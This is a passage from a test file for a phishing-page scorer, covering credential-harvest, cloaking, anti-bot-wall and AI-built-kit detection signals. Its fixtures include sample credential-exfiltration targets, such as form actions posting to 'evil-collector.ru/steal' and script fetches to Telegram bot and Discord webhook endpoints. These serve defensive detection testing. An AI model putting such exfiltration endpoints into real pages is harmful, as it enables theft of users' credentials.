import { describe, it, expect } from "vitest";
import {
  scorePagePhishing,
  escalateThreatLevelForPage,
  shadowScoreDelta,
  computeShadowPageSignals,
  SIGNAL_WEIGHTS,
  SHADOW_SIGNAL_WEIGHTS,
  SHADOW_CLASS_A_CAP,
  SHADOW_CLASS_A_KEYS,
  type ParsedPageSignals,
  type PageScoreContext,
  type ShadowSignalKey,
  type PageThreatLevel,
} from "../src/lib/page-phishing-scorer";

// Empty baseline — nothing fires. Lane 3 fields included (spec §7.2 /
// defect 7.2's fixture gap — test/ isn't typechecked, so a fixture
// missing a required ParsedPageSignals field compiles/runs silently and
// hands computeShadowPageSignals `undefined`; fixing the fixture here
// rather than leaning on the scorer's defensive `??` fallbacks).
const emptySignals: ParsedPageSignals = {
  hasPasswordInput: false,
  formActions: [],
  resourceUrls: [],
  iconHrefs: [],
  metaRefresh: null,
  scriptRedirectTargets: [],
  title: "",
  bodyTextSample: "",
  antiBotWall: null,
  scriptTextSample: "",
  scriptSinkTargets: [],
  commentSamples: [],
  metaGenerator: null,
  svgScriptPayload: false,
  svgDownloadDisguise: false,
};

const ctx: PageScoreContext = {
  suspectDomain: "acme-secure-login.com",
  brandDomain: "acme.com",
  brandName: "Acme",
};

describe("scorePagePhishing — individual signals", () => {
  it("fires nothing on an empty page", () => {
    const r = scorePagePhishing(emptySignals, ctx);
    expect(r.score).toBe(0);
    expect(r.signals).toEqual([]);
    expect(r.credentialHarvest).toBe(false);
  });

  it("credential_form fires on a password input", () => {
    const r = scorePagePhishing({ ...emptySignals, hasPasswordInput: true }, ctx);
    expect(r.signals).toContain("credential_form");
    expect(r.score).toBe(SIGNAL_WEIGHTS.credential_form);
    expect(r.credentialHarvest).toBe(false); // no off-domain form yet
  });

  it("offdomain_form_exfil fires when a form posts to a different registrable domain", () => {
    const r = scorePagePhishing(
      { ...emptySignals, formActions: ["https://evil-collector.ru/steal"] },
      ctx,
    );
    expect(r.signals).toContain("offdomain_form_exfil");
    expect(r.score).toBe(SIGNAL_WEIGHTS.offdomain_form_exfil);
  });

  it("offdomain_form_exfil does NOT fire for a same-registrable-domain subdomain action", () => {
    const r = scorePagePhishing(
      { ...emptySignals, formActions: ["https://login.acme-secure-login.com/post"] },
      ctx,
    );
    expect(r.signals).not.toContain("offdomain_form_exfil");
  });

  it("offdomain_form_exfil does NOT fire for a relative action (same origin)", () => {
    const r = scorePagePhishing(
      { ...emptySignals, formActions: ["/submit", "login.php", "#"] },
      ctx,
    );
    expect(r.signals).not.toContain("offdomain_form_exfil");
    expect(r.score).toBe(0);
  });

  it("brand_asset_hotlink fires when a resource is served from the real brand domain", () => {
    const r = scorePagePhishing(
      { ...emptySignals, resourceUrls: ["https://cdn.acme.com/logo.png"] },
      ctx,
    );
    expect(r.signals).toContain("brand_asset_hotlink");
  });

  it("brand_asset_hotlink does NOT fire for a generic third-party CDN", () => {
    const r = scorePagePhishing(
      { ...emptySignals, resourceUrls: ["https://cdn.jsdelivr.net/x.js"] },
      ctx,
    );
    expect(r.signals).not.toContain("brand_asset_hotlink");
  });

  it("favicon_clone fires when the icon points at the real brand domain", () => {
    const r = scorePagePhishing(
      { ...emptySignals, iconHrefs: ["https://acme.com/favicon.ico"] },
      ctx,
    );
    expect(r.signals).toContain("favicon_clone");
  });

  it("a lone brand favicon scores favicon_clone ONLY, not also brand_asset_hotlink (no double-count)", () => {
    // The fixed extractor routes icon hrefs to iconHrefs only, never
    // resourceUrls — so one favicon <link> must not fire both signals.
    const r = scorePagePhishing(
      { ...emptySignals, iconHrefs: ["https://acme.com/favicon.ico"], resourceUrls: [] },
      ctx,
    );
    expect(r.signals).toEqual(["favicon_clone"]);
    expect(r.signals).not.toContain("brand_asset_hotlink");
    expect(r.score).toBe(SIGNAL_WEIGHTS.favicon_clone);
  });

  it("title_keyword_density fires when the brand name is in the title on a non-brand host", () => {
    const r = scorePagePhishing(
      { ...emptySignals, title: "Acme Account Login" },
      ctx,
    );
    expect(r.signals).toContain("title_keyword_density");
  });

  it("title_keyword_density does NOT fire when the suspect IS the brand domain", () => {
    const r = scorePagePhishing(
      { ...emptySignals, title: "Acme Account Login" },
      { suspectDomain: "acme.com", brandDomain: "acme.com", brandName: "Acme" },
    );
    expect(r.signals).not.toContain("title_keyword_density");
  });

  it("title_keyword_density fires on dense body repetition (>=3) even without a title hit", () => {
    const r = scorePagePhishing(
      { ...emptySignals, bodyTextSample: "acme acme welcome to acme secure" },
      ctx,
    );
    expect(r.signals).toContain("title_keyword_density");
  });

  it("cloaking_redirect fires on a meta-refresh to the real brand", () => {
    const r = scorePagePhishing(
      { ...emptySignals, metaRefresh: "3; url=https://acme.com/" },
      ctx,
    );
    expect(r.signals).toContain("cloaking_redirect");
  });

  it("cloaking_redirect fires on a JS redirect target to the real brand", () => {
    const r = scorePagePhishing(
      { ...emptySignals, scriptRedirectTargets: ["https://acme.com/verify"] },
      ctx,
    );
    expect(r.signals).toContain("cloaking_redirect");
  });
});

describe("scorePagePhishing — credential harvest + scoring", () => {
  it("credentialHarvest is true only when BOTH password input and off-domain form fire", () => {
    const r = scorePagePhishing(
      {
        ...emptySignals,
        hasPasswordInput: true,
        formActions: ["https://evil-collector.ru/steal"],
      },
      ctx,
    );
    expect(r.credentialHarvest).toBe(true);
    expect(r.signals).toContain("credential_form");
    expect(r.signals).toContain("offdomain_form_exfil");
    expect(r.score).toBe(SIGNAL_WEIGHTS.credential_form + SIGNAL_WEIGHTS.offdomain_form_exfil);
  });

  it("score is capped at 100 when every signal fires", () => {
    const r = scorePagePhishing(
      {
        ...emptySignals,
        hasPasswordInput: true,
        formActions: ["https://evil-collector.ru/steal"],
        resourceUrls: ["https://acme.com/logo.png"],
        iconHrefs: ["https://acme.com/favicon.ico"],
        metaRefresh: "0; url=https://acme.com",
        scriptRedirectTargets: ["https://acme.com/x"],
        title: "Acme Login",
        bodyTextSample: "acme acme acme",
        antiBotWall: "turnstile",
      },
      ctx,
    );
    expect(r.score).toBe(100);
    expect(r.credentialHarvest).toBe(true);
  });

  it("handles a null brand domain/name without firing brand-relative signals", () => {
    const r = scorePagePhishing(
      { ...emptySignals, hasPasswordInput: true, resourceUrls: ["https://acme.com/x.png"] },
      { suspectDomain: "acme-secure-login.com", brandDomain: null, brandName: null },
    );
    expect(r.signals).toEqual(["credential_form"]);
  });
});

describe("anti_bot_wall — cloaking-as-signal (rec 4)", () => {
  it("anti_bot_wall fires with weight 20 when the fetcher recorded a wall family", () => {
    const r = scorePagePhishing({ ...emptySignals, antiBotWall: "turnstile" }, ctx);
    expect(r.signals).toContain("anti_bot_wall");
    expect(r.score).toBe(SIGNAL_WEIGHTS.anti_bot_wall);
    expect(r.score).toBe(20);
  });

  it("antiBotWallFamily echoes the fetcher's family when no js_challenge overlap", () => {
    const r = scorePagePhishing({ ...emptySignals, antiBotWall: "recaptcha" }, ctx);
    expect(r.antiBotWallFamily).toBe("recaptcha");
  });

  it("antiBotWallFamily is null and anti_bot_wall does not fire on a clean page", () => {
    const r = scorePagePhishing(emptySignals, ctx);
    expect(r.antiBotWallFamily).toBeNull();
    expect(r.signals).not.toContain("anti_bot_wall");
  });

  it("js_challenge fires: a JS redirect to a NON-brand domain + a challenge phrase, with brand context", () => {
    const r = scorePagePhishing(
      {
        ...emptySignals,
        scriptRedirectTargets: ["https://not-acme-at-all.ru/gate"],
        bodyTextSample: "checking your browser before continuing",
      },
      ctx,
    );
    expect(r.signals).toContain("anti_bot_wall");
    expect(r.antiBotWallFamily).toBe("js_challenge");
  });

  it("js_challenge does NOT fire without brand context (brandReg null gates condition 1)", () => {
    const r = scorePagePhishing(
      {
        ...emptySignals,
        scriptRedirectTargets: ["https://not-acme-at-all.ru/gate"],
        bodyTextSample: "checking your browser before continuing",
      },
      { suspectDomain: "acme-secure-login.com", brandDomain: null, brandName: null },
    );
    expect(r.signals).not.toContain("anti_bot_wall");
    expect(r.antiBotWallFamily).toBeNull();
  });

  it("js_challenge does NOT fire on a redirect target WITHOUT a challenge phrase (redirect alone is cloaking_redirect's inverse, not this signal)", () => {
    const r = scorePagePhishing(
      { ...emptySignals, scriptRedirectTargets: ["https://not-acme-at-all.ru/gate"] },
      ctx,
    );
    expect(r.signals).not.toContain("anti_bot_wall");
  });

  it("js_challenge does NOT fire on a challenge phrase alone without an off-brand JS redirect", () => {
    const r = scorePagePhishing(
      { ...emptySignals, bodyTextSample: "just a moment while we verify" },
      ctx,
    );
    expect(r.signals).not.toContain("anti_bot_wall");
  });

  it("js_challenge (brand-relative) overrides the fetcher's cf_challenge family in the overlap", () => {
    const r = scorePagePhishing(
      {
        ...emptySignals,
        antiBotWall: "cf_challenge",
        scriptRedirectTargets: ["https://not-acme-at-all.ru/gate"],
        bodyTextSample: "checking your browser before continuing",
      },
      ctx,
    );
    expect(r.signals).toContain("anti_bot_wall");
    expect(r.antiBotWallFamily).toBe("js_challenge");
  });

  it("anti_bot_wall fires exactly once even when both the fetcher wall AND js_challenge are present (no double weight)", () => {
    const r = scorePagePhishing(
      {
        ...emptySignals,
        antiBotWall: "cf_challenge",
        scriptRedirectTargets: ["https://not-acme-at-all.ru/gate"],
        bodyTextSample: "checking your browser before continuing",
      },
      ctx,
    );
    expect(r.signals.filter((s) => s === "anti_bot_wall")).toHaveLength(1);
    expect(r.score).toBe(SIGNAL_WEIGHTS.anti_bot_wall);
  });
});

describe("escalateThreatLevelForPage — monotonic", () => {
  it("credential harvest escalates MEDIUM to CRITICAL", () => {
    expect(escalateThreatLevelForPage("MEDIUM", { score: 75, credentialHarvest: true, antiBotWall: false })).toBe("CRITICAL");
  });

  it("credential harvest escalates LOW to CRITICAL", () => {
    expect(escalateThreatLevelForPage("LOW", { score: 75, credentialHarvest: true, antiBotWall: false })).toBe("CRITICAL");
  });

  it("strong score (>=60) escalates MEDIUM to HIGH", () => {
    expect(escalateThreatLevelForPage("MEDIUM", { score: 60, credentialHarvest: false, antiBotWall: false })).toBe("HIGH");
  });

  it("moderate score (>=30) escalates LOW to MEDIUM", () => {
    expect(escalateThreatLevelForPage("LOW", { score: 45, credentialHarvest: false, antiBotWall: false })).toBe("MEDIUM");
  });

  it("never downgrades an existing CRITICAL", () => {
    expect(escalateThreatLevelForPage("CRITICAL", { score: 10, credentialHarvest: false, antiBotWall: false })).toBe("CRITICAL");
  });

  it("never downgrades HIGH to MEDIUM", () => {
    expect(escalateThreatLevelForPage("HIGH", { score: 35, credentialHarvest: false, antiBotWall: false })).toBe("HIGH");
  });

  it("leaves level unchanged on a zero score", () => {
    expect(escalateThreatLevelForPage("LOW", { score: 0, credentialHarvest: false, antiBotWall: false })).toBe("LOW");
  });
});

describe("escalateThreatLevelForPage — bare anti-bot-wall MEDIUM floor (rec 4)", () => {
  it("a bare wall (score 20, < 30) escalates LOW to MEDIUM", () => {
    expect(
      escalateThreatLevelForPage("LOW", { score: 20, credentialHarvest: false, antiBotWall: true }),
    ).toBe("MEDIUM");
  });

  it("no wall at the same sub-30 score leaves LOW unchanged (the floor is wall-gated, not score-gated alone)", () => {
    expect(
      escalateThreatLevelForPage("LOW", { score: 20, credentialHarvest: false, antiBotWall: false }),
    ).toBe("LOW");
  });

  it("a wall is the LAST branch — a score already >= 30 reaches MEDIUM via the score branch regardless of the wall flag", () => {
    expect(
      escalateThreatLevelForPage("LOW", { score: 30, credentialHarvest: false, antiBotWall: false }),
    ).toBe("MEDIUM");
  });

  it("CRITICALLY: a wall on an already-HIGH page is NOT downgraded to MEDIUM", () => {
    expect(
      escalateThreatLevelForPage("HIGH", { score: 20, credentialHarvest: false, antiBotWall: true }),
    ).toBe("HIGH");
  });

  it("CRITICALLY: a wall on an already-CRITICAL page is NOT downgraded to MEDIUM", () => {
    expect(
      escalateThreatLevelForPage("CRITICAL", { score: 20, credentialHarvest: false, antiBotWall: true }),
    ).toBe("CRITICAL");
  });

  it("end-to-end: a credential-harvest page (HIGH/CRITICAL-bound) that ALSO carries a wall still lands on CRITICAL, not MEDIUM", () => {
    // Assemble a real scorer result — password input + off-domain form exfil
    // (credentialHarvest) plus a wall — and feed it straight into the
    // escalation fn, exactly as the real caller would.
    const r = scorePagePhishing(
      {
        ...emptySignals,
        hasPasswordInput: true,
        formActions: ["https://evil-collector.ru/steal"],
        antiBotWall: "turnstile",
      },
      ctx,
    );
    expect(r.credentialHarvest).toBe(true);
    expect(r.signals).toContain("anti_bot_wall");

    const level = escalateThreatLevelForPage("LOW", {
      score: r.score,
      credentialHarvest: r.credentialHarvest,
      antiBotWall: r.signals.includes("anti_bot_wall"),
    });
    expect(level).toBe("CRITICAL");
  });
});

// ════════════════════════════════════════════════════════════════════
// Lane 3 — AI-build artifacts & covert exfil sinks. SHADOW MODE.
// docs/LANE3_AI_BUILD_ARTIFACTS_SPEC.md §3.1 / §3.3 / §5 / §9 step 6.
// Modelled on the anti_bot_wall describe block above.
// ════════════════════════════════════════════════════════════════════

describe("computeShadowPageSignals — covert_exfil_sink (B1, weight 20)", () => {
  it("fires from a <form action> matching a named covert channel and extracts the Telegram bot id (the pivot key)", () => {
    const parsed: ParsedPageSignals = {
      ...emptySignals,
      formActions: ["https://api.telegram.org/bot123456789:AAExampleToken/sendMessage"],
    };
    const shadow = computeShadowPageSignals(parsed);
    expect(shadow.aiSignals).toContain("covert_exfil_sink");
    expect(shadow.exfilSink).toBe("api.telegram.org");
    expect(shadow.exfilSinkId).toBe("123456789");
    expect(shadow.evidence.covert_exfil_sink).toBe("api.telegram.org/bot");
  });

  it("fires from a SCRIPT-literal sink — the live false negative offdomain_form_exfil cannot see (spec §1)", () => {
    const parsed: ParsedPageSignals = {
      ...emptySignals,
      scriptSinkTargets: ["discord.com/api/webhooks/998877/tokenvalue"],
    };
    const shadow = computeShadowPageSignals(parsed);
    expect(shadow.aiSignals).toContain("covert_exfil_sink");
    expect(shadow.exfilSinkId).toBe("998877");
  });

  it("fires on an ephemeral tunnel host target (structural variant, no id)", () => {
    const parsed: ParsedPageSignals = {
      ...emptySignals,
      scriptSinkTargets: ["https://abc123.ngrok-free.app/collect"],
    };
    const shadow = computeShadowPageSignals(parsed);
    expect(shadow.aiSignals).toContain("covert_exfil_sink");
    expect(shadow.exfilSinkId).toBeNull();
  });

  it("does NOT fire on an ordinary off-domain form action (discipline: a generic exfil target is not a NAMED covert channel)", () => {
    const parsed: ParsedPageSignals = {
      ...emptySignals,
      formActions: ["https://not-a-sink.example/post"],
    };
    const shadow = computeShadowPageSignals(parsed);
    expect(shadow.aiSignals).not.toContain("covert_exfil_sink");
    expect(shadow.exfilSink).toBeNull();
  });

  it("BOUNDS the persisted sink host: an absurd (> 253 char) host is rejected outright, never persisted", () => {
    // `pushBounded` in the fetcher caps the NUMBER of form actions, never
    // the LENGTH of one, so this reached the column verbatim and could
    // blow the diagnostics Map / KV value ceiling / the success UPDATE.
    // A host this long cannot resolve, so rejecting it loses nothing.
    const absurd = "a".repeat(400_000);
    const parsed: ParsedPageSignals = {
      ...emptySignals,
      formActions: [`https://${absurd}.ngrok.io/c`],
    };
    const shadow = computeShadowPageSignals(parsed);
    expect(shadow.exfilSink).toBeNull();
    expect(shadow.aiSignals).not.toContain("covert_exfil_sink");
  });

  it("a legal-length tunnel host still fires and is persisted whole", () => {
    const host = `${"a".repeat(200)}.ngrok.io`;
    const parsed: ParsedPageSignals = {
      ...emptySignals,
      formActions: [`https://${host}/c`],
    };
    const shadow = computeShadowPageSignals(parsed);
    expect(shadow.aiSignals).toContain("covert_exfil_sink");
    expect(shadow.exfilSink).toBe(host);
    expect(shadow.exfilSink!.length).toBeLessThanOrEqual(253);
  });

  it("every persisted sink host stays within the DNS-name bound", () => {
    const parsed: ParsedPageSignals = {
      ...emptySignals,
      formActions: [`https://${"b".repeat(300)}.ngrok.io/c`, "https://api.telegram.org/bot42:tok/x"],
    };
    const shadow = computeShadowPageSignals(parsed);
    expect(shadow.exfilSink).toBe("api.telegram.org");
    expect(shadow.exfilSink!.length).toBeLessThanOrEqual(253);
  });

  it("a covert-sink prefix riding in the QUERY STRING does not attribute the sink to the surrounding host", () => {
    // Previously the prefix was tested against the whole lowered
    // reference but the HOST was read from the URL, producing a
    // contradictory triple (host relay.example / evidence
    // api.telegram.org/bot / id out of the query) straight into the
    // clustering columns §6 exists to produce.
    const parsed: ParsedPageSignals = {
      ...emptySignals,
      formActions: ["https://relay.example/x?next=https://api.telegram.org/bot777:AAtok/sendMessage"],
    };
    const shadow = computeShadowPageSignals(parsed);
    expect(shadow.aiSignals).toContain("covert_exfil_sink");
    // host / evidence / id all describe the SAME endpoint.
    expect(shadow.exfilSink).toBe("api.telegram.org");
    expect(shadow.evidence.covert_exfil_sink).toBe("api.telegram.org/bot");
    expect(shadow.exfilSinkId).toBe("777");
  });

  it("a scheme-less covert-sink literal at position 0 still resolves host + id from the literal", () => {
    const parsed: ParsedPageSignals = {
      ...emptySignals,
      scriptSinkTargets: ["api.telegram.org/bot555:AAtok/sendMessage"],
    };
    const shadow = computeShadowPageSignals(parsed);
    expect(shadow.exfilSink).toBe("api.telegram.org");
    expect(shadow.exfilSinkId).toBe("555");
  });

  it("the persisted sink id stops at the token boundary — the SECRET is never captured (migration 0264 constraint)", () => {
    const parsed: ParsedPageSignals = {
      ...emptySignals,
      formActions: ["https://api.telegram.org/bot123456789:AAH-SuperSecretToken/sendMessage"],
    };
    const shadow = computeShadowPageSignals(parsed);
    expect(shadow.exfilSinkId).toBe("123456789");
    const persisted = JSON.stringify({
      sink: shadow.exfilSink,
      id: shadow.exfilSinkId,
      evidence: shadow.evidence,
    });
    expect(persisted).not.toContain("SuperSecretToken");
  });
});

describe("scorePagePhishing — Phase 1 shadow call is unconditionally guarded", () => {
  it("a malformed (non-array) Lane 3 field cannot make the scorer throw — the live verdict still lands", () => {
    // If this throws, runPageAnalysisForDomain throws BEFORE either
    // UPDATE, page_fetched_at is never stamped, and the domain re-enters
    // the `page_fetched_at IS NULL` batch every tick forever. "Changes
    // nothing" is the premise of Phase 1.
    const poisoned = {
      ...emptySignals,
      hasPasswordInput: true,
      commentSamples: 42 as unknown as string[],
      scriptSinkTargets: { nope: true } as unknown as string[],
    } satisfies ParsedPageSignals;

    const result = scorePagePhishing(poisoned, ctx);
    expect(result.signals).toContain("credential_form");
    expect(result.score).toBe(SIGNAL_WEIGHTS.credential_form);
    // Shadow bundle degrades to an empty no-op.
    expect(result.aiSignals).toEqual([]);
    expect(result.scoreDelta).toBe(0);
    expect(result.evidence).toEqual({});
    expect(result.exfilSink).toBeNull();
    expect(result.exfilSinkId).toBeNull();
    expect(result.pageGenerator).toBeNull();
  });
});

describe("computeShadowPageSignals — form_relay_sink (B2, weight 10)", () => {
  it("fires on a generic form-relay backend", () => {
    const parsed: ParsedPageSignals = { ...emptySignals, formActions: ["https://formspree.io/f/xyz"] };
    const shadow = computeShadowPageSignals(parsed);
    expect(shadow.aiSignals).toContain("form_relay_sink");
    expect(shadow.evidence.form_relay_sink).toBe("formspree.io");
  });

  it("does NOT fire on a same-origin relative form action (discipline: no false positive on an ordinary local contact form)", () => {
    const parsed: ParsedPageSignals = { ...emptySignals, formActions: ["/contact"] };
    const shadow = computeShadowPageSignals(parsed);
    expect(shadow.aiSignals).not.toContain("form_relay_sink");
  });
});

describe("computeShadowPageSignals — svg_script_payload (C1, weight 15)", () => {
  it("leg (a) fires when the fetcher recorded an svgScriptPayload", () => {
    const parsed: ParsedPageSignals = { ...emptySignals, svgScriptPayload: true };
    const shadow = computeShadowPageSignals(parsed);
    expect(shadow.aiSignals).toContain("svg_script_payload");
    expect(shadow.evidence.svg_script_payload).toBe("svg subtree: script/foreignObject/on*");
  });

  it("leg (b) fires when the fetcher recorded an svgDownloadDisguise", () => {
    const parsed: ParsedPageSignals = { ...emptySignals, svgDownloadDisguise: true };
    const shadow = computeShadowPageSignals(parsed);
    expect(shadow.aiSignals).toContain("svg_script_payload");
    expect(shadow.evidence.svg_script_payload).toBe("a[download] -> data:image/svg+xml");
  });

  it("does NOT fire when neither svg flag was recorded (discipline: an ordinary inline <svg> icon is not a payload)", () => {
    const shadow = computeShadowPageSignals(emptySignals);
    expect(shadow.aiSignals).not.toContain("svg_script_payload");
  });
});

describe("computeShadowPageSignals — llm_refusal_leakage (A1, weight 15)", () => {
  it("fires on a model-refusal literal left in body text", () => {
    const parsed: ParsedPageSignals = {
      ...emptySignals,
      bodyTextSample: "I'm sorry, but I can't help with that request.",
    };
    const shadow = computeShadowPageSignals(parsed);
    expect(shadow.aiSignals).toContain("llm_refusal_leakage");
    expect(shadow.evidence.llm_refusal_leakage).toBe("i'm sorry, but i can't");
  });

  it("does NOT fire on ordinary AI-product marketing copy (discipline: mentioning AI is not leaking a refusal)", () => {
    const parsed: ParsedPageSignals = {
      ...emptySignals,
      bodyTextSample: "Our AI-powered assistant is available 24/7 to help you.",
    };
    const shadow = computeShadowPageSignals(parsed);
    expect(shadow.aiSignals).not.toContain("llm_refusal_leakage");
  });
});

describe("computeShadowPageSignals — unrendered_template_token (A2, weight 12)", () => {
  it("fires on an unsubstituted template token in rendered body text", () => {
    const parsed: ParsedPageSignals = {
      ...emptySignals,
      bodyTextSample: "Welcome {{user.name}} to our totally real portal",
    };
    const shadow = computeShadowPageSignals(parsed);
    expect(shadow.aiSignals).toContain("unrendered_template_token");
    expect(shadow.evidence.unrendered_template_token).toBe("{{user.name}}");
  });

  it("does NOT fire when the delimited run isn't an identifier (discipline: a real interpolated price like ${19.99} is not a build failure)", () => {
    const parsed: ParsedPageSignals = { ...emptySignals, bodyTextSample: "Total: ${19.99} due today" };
    const shadow = computeShadowPageSignals(parsed);
    expect(shadow.aiSignals).not.toContain("unrendered_template_token");
  });
});

describe("computeShadowPageSignals — default_scaffold_title (A3, weight 12)", () => {
  it("fires on an EXACT default scaffold title", () => {
    const parsed: ParsedPageSignals = { ...emptySignals, title: "Vite App" };
    const shadow = computeShadowPageSignals(parsed);
    expect(shadow.aiSignals).toContain("default_scaffold_title");
    expect(shadow.evidence.default_scaffold_title).toBe("vite app");
  });

  it("does NOT fire on an unrelated title (discipline: exact-or-prefix only, not a generic small-title heuristic)", () => {
    const parsed: ParsedPageSignals = { ...emptySignals, title: "Northwind Traders — Customer Portal" };
    const shadow = computeShadowPageSignals(parsed);
    expect(shadow.aiSignals).not.toContain("default_scaffold_title");
  });

  it('DOES fire on "Document Management Portal" via the prefix leg on "document" — a KNOWN, documented residual FP, not a bug (spec §3.1 A3 / §5.3 negative control is the instrument for deciding whether this survives promotion)', () => {
    // page-phishing-scorer.ts's own comment on DEFAULT_SCAFFOLD_TITLES
    // acknowledges this exact case. Asserting the real behavior here
    // (not a softened one) is the point: shadow mode exists precisely to
    // measure how often this fires on brand-canonical homepages (§5.3)
    // before any promotion decision is made — this test must keep
    // failing loudly if a future "fix" quietly narrows the match instead
    // of going through that measurement.
    const parsed: ParsedPageSignals = { ...emptySignals, title: "Document Management Portal" };
    const shadow = computeShadowPageSignals(parsed);
    expect(shadow.aiSignals).toContain("default_scaffold_title");
    expect(shadow.evidence.default_scaffold_title).toBe("document");
  });
});

describe("computeShadowPageSignals — build_placeholder_text (A4, weight 8)", () => {
  it("fires on placeholder copy in rendered body text", () => {
    const parsed: ParsedPageSignals = { ...emptySignals, bodyTextSample: "Your Company Name Inc. — About Us" };
    const shadow = computeShadowPageSignals(parsed);
    expect(shadow.aiSignals).toContain("build_placeholder_text");
    expect(shadow.evidence.build_placeholder_text).toBe("your company name");
  });

  it("fires on placeholder copy left in an HTML comment", () => {
    const parsed: ParsedPageSignals = { ...emptySignals, commentSamples: ["swap out lorem ipsum before launch"] };
    const shadow = computeShadowPageSignals(parsed);
    expect(shadow.aiSignals).toContain("build_placeholder_text");
    expect(shadow.evidence.build_placeholder_text).toBe("lorem ipsum");
  });

  it('does NOT fire on a `placeholder=` ATTRIBUTE value (discipline, spec A4: "text nodes and comments only, never placeholder= attributes") — structural, because the fetcher never captures that attribute into bodyTextSample at all', () => {
    // There is no field on ParsedPageSignals for a raw attribute value —
    // page-fetch.ts's <input> hook reads only `type`, never `placeholder`
    // — so a page whose ONLY "lorem ipsum" lives in a placeholder=
    // attribute hands the scorer bodyTextSample with no trace of it,
    // exactly like this fixture. That structural exclusion IS the test.
    const parsed: ParsedPageSignals = {
      ...emptySignals,
      bodyTextSample: "Enter your email address below to sign in.",
    };
    const shadow = computeShadowPageSignals(parsed);
    expect(shadow.aiSignals).not.toContain("build_placeholder_text");
  });
});

describe("computeShadowPageSignals — agent_scaffold_comment (A5, weight 8)", () => {
  it("fires on a markdown checkbox in a single comment", () => {
    const parsed: ParsedPageSignals = {
      ...emptySignals,
      commentSamples: ["- [ ] wire up real auth\n- [ ] remove test data"],
    };
    const shadow = computeShadowPageSignals(parsed);
    expect(shadow.aiSignals).toContain("agent_scaffold_comment");
    expect(shadow.evidence.agent_scaffold_comment).toBe("- [ ]");
  });

  it("fires on two-or-more numbered step lines in a single comment", () => {
    const parsed: ParsedPageSignals = {
      ...emptySignals,
      commentSamples: ["Step 1: scaffold routes\nStep 2: wire auth"],
    };
    const shadow = computeShadowPageSignals(parsed);
    expect(shadow.aiSignals).toContain("agent_scaffold_comment");
  });

  it('does NOT fire on a bare "TODO" substring — a single marker occurrence, no structure (THE required discipline case: "TODO" alone is one of the most common strings in unminified HTML comments)', () => {
    const parsed: ParsedPageSignals = { ...emptySignals, commentSamples: ["TODO: fix later"] };
    const shadow = computeShadowPageSignals(parsed);
    expect(shadow.aiSignals).not.toContain("agent_scaffold_comment");
  });

  it("does NOT fire when two todo:/fixme: markers are split across TWO SEPARATE comments (per-comment scoping, not a concatenated blob)", () => {
    const parsed: ParsedPageSignals = {
      ...emptySignals,
      commentSamples: ["todo: wire auth", "fixme: add tests"],
    };
    const shadow = computeShadowPageSignals(parsed);
    expect(shadow.aiSignals).not.toContain("agent_scaffold_comment");
  });
});

// ─── Class A cap arithmetic (spec §3.1 / §3.3) ─────────────────────────
// THE CLASS A WEIGHTS SUM TO 55 AND THE CAP IS 20 — INTENTIONAL. Two
// properties must hold, and these are their direct tests.

describe("Lane 3 — Class A cap arithmetic", () => {
  it("property 1: all five Class A signals firing ALONE contribute exactly 20 (capped from 55) and the page stays LOW", () => {
    const parsed: ParsedPageSignals = {
      ...emptySignals,
      title: "vite app", // A3
      bodyTextSample:
        "as an ai language model. Welcome {{user.name}} to your company name inc.", // A1 + A2 + A4
      commentSamples: ["- [ ] finish OAuth flow"], // A5
    };
    const r = scorePagePhishing(parsed, ctx);
    // No real (non-shadow) signal fires on this fixture — it's Class A only.
    expect(r.signals).toEqual([]);
    expect(r.score).toBe(0);
    expect(r.aiSignals.sort()).toEqual(
      [
        "llm_refusal_leakage",
        "unrendered_template_token",
        "default_scaffold_title",
        "build_placeholder_text",
        "agent_scaffold_comment",
      ].sort(),
    );
    const delta = shadowScoreDelta(r.aiSignals);
    expect(delta.classASum).toBe(55); // 15+12+12+8+8, uncapped
    expect(delta.classAContribution).toBe(SHADOW_CLASS_A_CAP);
    expect(delta.classAContribution).toBe(20);
    expect(delta.capHit).toBe(true);
    expect(r.scoreDelta).toBe(20);
    // The property: even added to a zero real score, 20 < 30 (MEDIUM
    // threshold) — Class A can NEVER reach MEDIUM alone.
    expect(r.score + r.scoreDelta).toBeLessThan(30);
  });

  it("property 2: a real MEDIUM page (37) plus the capped Class A delta (20) sums to 57 — MEDIUM, never HIGH", () => {
    const parsed: ParsedPageSignals = {
      ...emptySignals,
      resourceUrls: ["https://acme.com/logo.png"], // brand_asset_hotlink (15)
      iconHrefs: ["https://acme.com/favicon.ico"], // favicon_clone (12)
      title: "Acme Account Portal", // title_keyword_density (10)
      bodyTextSample: "as an ai language model. Welcome {{user.name}} to our page", // A1(15) + A2(12) = 35 > cap
    };
    const r = scorePagePhishing(parsed, ctx);
    expect(r.signals.sort()).toEqual(["brand_asset_hotlink", "favicon_clone", "title_keyword_density"].sort());
    expect(r.score).toBe(37);
    const delta = shadowScoreDelta(r.aiSignals);
    expect(delta.classASum).toBe(27); // 15 + 12, > cap
    expect(delta.capHit).toBe(true);
    expect(r.scoreDelta).toBe(20); // capped, not 27
    const combined = r.score + r.scoreDelta;
    expect(combined).toBe(57);
    // At an UNCAPPED weight of 25 this would be 37+25=62 -> HIGH (spec's
    // own worked example for why 20, not 25). At 20 it stays MEDIUM.
    expect(combined).toBeGreaterThanOrEqual(30);
    expect(combined).toBeLessThan(60);
  });
});

// ─── Shadow-mode invariants — the most important tests in this file ────
// Nothing computed above may ever reach `score`, `signals`,
// `credentialHarvest`, or escalateThreatLevelForPage's verdict in Phase
// 1 (spec §5.1). These prove it by direct A/B comparison: the SAME real
// signals, with and without every shadow signal also firing, must
// produce byte-identical real-facing output.

describe("Lane 3 — shadow-mode invariants (score/signals/credentialHarvest/escalation unchanged; no ShadowSignalKey leaks into `signals`)", () => {
  const sharedRealFields = {
    hasPasswordInput: true,
    formActions: ["https://evil-collector.ru/steal"], // credential_form + offdomain_form_exfil
    resourceUrls: ["https://acme.com/logo.png"], // brand_asset_hotlink
    iconHrefs: ["https://acme.com/favicon.ico"], // favicon_clone
    metaRefresh: null,
    scriptRedirectTargets: [],
    antiBotWall: "turnstile", // anti_bot_wall
  };

  const withShadowSignals: ParsedPageSignals = {
    ...sharedRealFields,
    title: "vite app", // A3
    bodyTextSample: "as an ai language model. Welcome {{user.name}} to your company name inc.", // A1+A2+A4
    scriptTextSample: "fetch('https://api.telegram.org/bot123456789:AA/x')",
    scriptSinkTargets: ["api.telegram.org/bot123456789:AA/x"], // B1
    commentSamples: ["- [ ] finish OAuth flow"], // A5
    metaGenerator: "Next.js", // M1
    svgScriptPayload: true, // C1
    svgDownloadDisguise: false,
  };

  const withoutShadowSignals: ParsedPageSignals = {
